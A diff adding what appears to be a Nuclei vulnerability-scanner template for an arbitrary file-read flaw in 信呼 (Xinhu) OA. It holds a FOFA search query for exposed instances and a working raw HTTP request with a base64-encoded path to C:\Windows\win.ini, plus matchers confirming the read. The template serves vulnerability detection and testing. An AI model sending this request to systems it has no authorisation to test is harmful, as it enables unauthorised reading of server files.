@@ -1,0 +1,24 @@
+id: xinhu-oa-file-read
+
+info:
+  name: 信呼-OA系统文件访问控制缺陷
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="信呼-OA系统"
+          信呼-OA系统为面向中小企业的在线办公管理平台，提供轻量级、开源的在线办公解决方案。该系统存在文件访问控制缺陷，攻击者可利用此缺陷读取任意文件内容。
+  tags: 信呼-OA系统
+
+http:
+- raw:
+  - |
+    GET /aqqzwzc/?m=sysfile&d=system&a=edit&path=QzpcXFdpbmRvd3NcXHdpbi5pbmk HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'app support'
